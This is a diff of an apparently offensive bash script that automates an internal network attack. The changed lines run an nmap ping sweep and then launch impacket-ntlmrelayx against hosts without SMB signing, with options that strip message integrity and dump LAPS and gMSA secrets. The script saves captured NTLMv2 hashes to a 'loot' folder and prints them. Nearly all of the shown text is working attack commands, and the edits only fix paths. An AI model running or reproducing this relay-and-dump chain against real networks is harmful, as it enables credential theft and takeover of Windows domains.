@@ -35,7 +35,7 @@ if [ -s /root/output/list/ipup.txt ]; then
 echo '! > nmap PE already done'
 else
    echo '! > NMAP PE Scan    FAST'
-   nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/ipint.txt > /dev/null 2>&1
+   nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/input/ipint.txt > /dev/null 2>&1
    echo ''
    echo '! >> Done'
 
@@ -81,7 +81,7 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 
 	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
 	echo '! > Starting NTLM-Relay'
-	timeout 300 impacket-ntlmrelayx -ip $IP -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
+	timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
 	echo ''
 
 	#Declaring variables for each PID of Responder and NTLMRelayX
@@ -95,10 +95,10 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 	wait $PID_RELAY
 	
 	#When Output-File exists and is not empty
-	if [ -s /root/output/ntlm_relay_ntlmv2.txt ]
+	if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]
 		then
 		#Show me 'dem Hashes
-		cat /root/output/ntlm_relay_ntlmv2.txt
+		cat /root/output/loot/ntlm_relay_ntlmv2.txt
 
 		else
 		echo '! >> No Hashes Found'
